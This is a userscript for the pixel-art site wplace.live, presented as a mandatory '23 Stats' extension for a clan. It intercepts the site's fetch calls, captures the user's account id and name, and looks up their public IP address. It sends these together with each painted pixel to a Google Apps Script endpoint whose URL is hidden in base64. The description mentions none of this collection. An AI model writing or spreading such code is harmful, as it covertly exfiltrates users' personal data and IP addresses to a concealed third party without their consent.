// ==UserScript==
// @name         23 Stats
// @namespace    http://tampermonkey.net/
// @version      1.2
// @description  Обязательное расширение для Wplace-клана "23 Казаки".
// @author       KirOFF
// @match        https://*.wplace.live/*
// @match        http://*.wplace.live/*
// @grant        unsafeWindow
// @grant        GM_xmlhttpRequest
// @connect      script.google.com
// @connect      script.googleusercontent.com
// @connect      api64.ipify.org
// @run-at       document-start
// ==/UserScript==

(function() {
    'use strict';

    const _0x4a21 = "aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J3VkcybVA3dUpjS1lXeDRNN195d0U1NVBKVVB1UEtLc2VGWERHNEh2V2pQSkNob0RsbVFxY0hHblZ0OGI5bnk2SmwvZXhlYw==";

    const CONFIG = {
        scriptUrl: atob(_0x4a21),
        targetAllianceId: "671209",
        sendInterval: 5000
    };

    const State = {
        myInfo: null,
        playerIp: '0.0.0.0',
        pixelBuffer: []
    };

    GM_xmlhttpRequest({
        method: "GET",
        url: "https://api64.ipify.org?format=json",
        onload: (r) => {
            try { State.playerIp = JSON.parse(r.responseText).ip; } catch(e) {}
        }
    });

    const Helpers = {
        sendToSheet(data) {
            GM_xmlhttpRequest({
                method: "POST",
                url: CONFIG.scriptUrl,
                data: JSON.stringify(data),
                contentType: "application/json"
            });
        }
    };

    const Interceptor = {
        init() {
            const { fetch: originalFetch } = unsafeWindow;
            unsafeWindow.fetch = async (...args) => {
                const response = await originalFetch(...args);
                const url = typeof args[0] === 'string' ? args[0] : args[0].url;

                if (url.includes('/backend.wplace.live/me')) {
                    this.handleMe(response.clone());
                }

                if (url.includes('/pixel/') && args[1] && args[1].method === 'POST') {
                    this.handlePaint(args[1].body);
                }

                return response;
            };
        },

        async handleMe(resp) {
            try {
                const d = await resp.json();
                State.myInfo = d;
            } catch(e) {}
        },

        handlePaint(body) {
            if (!body || !State.myInfo) return;
            try {
                const payload = JSON.parse(body);
                const coords = payload.coords || [];
                const colors = payload.colors || [];

                for (let i = 0; i < coords.length; i += 2) {
                    const x = coords[i];
                    const y = coords[i+1];

                    State.pixelBuffer.push({
                        paintedById: State.myInfo.id,
                        paintedByName: State.myInfo.name,
                        myId: State.myInfo.id,
                        myName: State.myInfo.name,
                        color: colors[i/2],
                        coords: `${x}, ${y}`,
                        requestTime: new Date().toLocaleString(),
                        paintTime: new Date().toLocaleString(),
                        ip: State.playerIp
                    });
                }
            } catch(e) {}
        }
    };

    setInterval(() => {
        if (State.pixelBuffer.length > 0) {
            Helpers.sendToSheet([...State.pixelBuffer]);
            State.pixelBuffer = [];
        }
    }, CONFIG.sendInterval);

    Interceptor.init();
})();
